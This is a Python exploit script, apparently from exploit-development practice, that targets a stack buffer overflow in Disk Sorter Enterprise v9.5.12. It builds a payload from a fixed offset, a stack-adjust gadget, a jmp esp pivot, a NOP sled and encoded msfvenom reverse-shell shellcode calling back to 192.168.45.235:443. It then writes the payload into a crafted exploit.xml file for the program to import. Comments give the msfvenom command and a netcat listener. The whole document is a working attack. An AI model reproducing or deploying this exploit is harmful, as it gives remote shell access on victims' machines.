#!/usr/bin/python3

from struct import pack
import pwn

def main() :
    payload = buildPayload()
    buf     = writeExploit(payload)

# relevant modules for ROP gadgets
# 10000000 10218000 libspg               /SafeSEH OFF                C:\Program Files\Disk Sorter Enterprise\bin\libspg.dll
# 65000000 653cb000 QtGui4               /SafeSEH OFF                C:\Program Files\Disk Sorter Enterprise\bin\QtGui4.dll

def buildPayload():
    payloadSize = 0x5000
    badchars = b"\x00\x27"

    buf  = b""

    # buf += pwn.cyclic(payloadSize)
    offBufEip = 0x600                                   # pwn.cyclic_find(0x7061616a)
    buf += b"A" * offBufEip

    # buf += b"BBBB"                                    # overwrite saved EIP
    # buf += bytes([ b for b in range(256)
    #                  if b not in badchars])

    buf += pack("<I", 0x10123ae2)                       # add esp, 0x20 (needed because some bytes on the stack inbetween are mangled)
    offEspShellcode = 0x30                              # align esp
    buf += b"C" * offEspShellcode

    buf += pack("<I", 0x652041ed)                       # jmp esp (pivot EIP)

    buf += b"\x90" * 0x20
    # buf += b"\xcc"                                    # int3

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.235 LPORT=443 -f python -e x86/xor_dynamic -b "\x00\x27"
    # nc -vlnp 443
    buf += b"\xeb\x23\x5b\x89\xdf\xb0\xb4\xfc\xae\x75\xfd\x89"
    buf += b"\xf9\x89\xde\x8a\x06\x30\x07\x47\x66\x81\x3f\xf0"
    buf += b"\x73\x74\x08\x46\x80\x3e\xb4\x75\xee\xeb\xea\xff"
    buf += b"\xe1\xe8\xd8\xff\xff\xff\x09\xb4\xf5\xe1\x8b\x09"
    buf += b"\x09\x09\x69\x80\xec\x38\xc9\x6d\x82\x59\x39\x82"
    buf += b"\x5b\x05\x82\x5b\x1d\x82\x7b\x21\x06\xbe\x43\x2f"
    buf += b"\x38\xf6\xa5\x35\x68\x75\x0b\x25\x29\xc8\xc6\x04"
    buf += b"\x08\xce\xeb\xfb\x5b\x5e\x82\x5b\x19\x82\x43\x35"
    buf += b"\x82\x45\x18\x71\xea\x41\x08\xd8\x58\x82\x50\x29"
    buf += b"\x08\xda\x82\x40\x11\xea\x33\x40\x82\x3d\x82\x08"
    buf += b"\xdf\x38\xf6\xa5\xc8\xc6\x04\x08\xce\x31\xe9\x7c"
    buf += b"\xff\x0a\x74\xf1\x32\x74\x2d\x7c\xed\x51\x82\x51"
    buf += b"\x2d\x08\xda\x6f\x82\x05\x42\x82\x51\x15\x08\xda"
    buf += b"\x82\x0d\x82\x08\xd9\x80\x4d\x2d\x2d\x52\x52\x68"
    buf += b"\x50\x53\x58\xf6\xe9\x56\x56\x53\x82\x1b\xe2\x84"
    buf += b"\x54\x61\x3a\x3b\x09\x09\x61\x7e\x7a\x3b\x56\x5d"
    buf += b"\x61\x45\x7e\x2f\x0e\xf6\xdc\xb1\x99\x08\x09\x09"
    buf += b"\x20\xcd\x5d\x59\x61\x20\x89\x62\x09\xf6\xdc\x59"
    buf += b"\x59\x59\x59\x49\x59\x49\x59\x61\xe3\x06\xd6\xe9"
    buf += b"\xf6\xdc\x9e\x63\x0c\x61\xc9\xa1\x24\xe2\x61\x0b"
    buf += b"\x09\x08\xb2\x80\xef\x63\x19\x5f\x5e\x61\x90\xac"
    buf += b"\x7d\x68\xf6\xdc\x8c\xc9\x7d\x05\xf6\x47\x01\x7c"
    buf += b"\xe5\x61\xf9\xbc\xab\x5f\xf6\xdc\x61\x6a\x64\x6d"
    buf += b"\x09\x80\xea\x5e\x5e\x5e\x38\xff\x63\x1b\x50\x5f"
    buf += b"\xeb\xf4\x6f\xce\x4d\x2d\x35\x08\x08\x84\x4d\x2d"
    buf += b"\x19\xcf\x09\x4d\x5d\x59\x5f\x5f\x5f\x4f\x5f\x47"
    buf += b"\x5f\x5f\x5a\x5f\x61\x70\xc5\x36\x8f\xf6\xdc\x80"
    buf += b"\xe9\x47\x5f\x4f\xf6\x39\x61\x01\x8e\x14\x69\xf6"
    buf += b"\xdc\xb2\xf9\xbc\xab\x5f\x61\xaf\x9c\xb4\x94\xf6"
    buf += b"\xdc\x35\x0f\x75\x03\x89\xf2\xe9\x7c\x0c\xb2\x4e"
    buf += b"\x1a\x7b\x66\x63\x09\x5a\xf6\xdc\xf0\x73"

    buf += b"Z" * (payloadSize - len(buf))

    assert len(buf) == payloadSize, "Mismatching size: f{len(buf)} != f{payloadSize}"
    for b in badchars:
        assert b not in buf, print(f"Error: badchar {hex(b)} ('{chr(b)}') appeared in payload", "\n\n", pwn.hexdump(buf))

    return buf

def writeExploit(payload):
    # in Program: Add Command, then Export Command to get idea of XML format
    # Import Command to trigger exploit
    xml = b"""<?xml version="1.0" encoding="UTF-8"?>
        <!-- Disk Sorter Enterprise v9.5.12 http://www.disksorter.com -->

        <classify name=""" + b"'" + payload + b""">

	        <directories>
		        <directory>C:\</directory>
	        </directories>

	        <plugin>Default File Classification Plugin</plugin>
	        <scanners mode='0'>2</scanners>
	        <show-users>no</show-users>
	        <report-title>File Classification Report</report-title>
	        <report-levels>1000000</report-levels>
	        <files-per-class>1000000</files-per-class>
	        <export-levels>1000000</export-levels>
	        <export-per-level>1000000</export-per-level>
	        <host>AUTO-SELECT</host>
	        <speed>FULL</speed>
	        <streams>1</streams>
        </classify>
        """

    with open("exploit.xml", "wb") as f:
        f.write(xml)

if __name__ == "__main__":
    main()
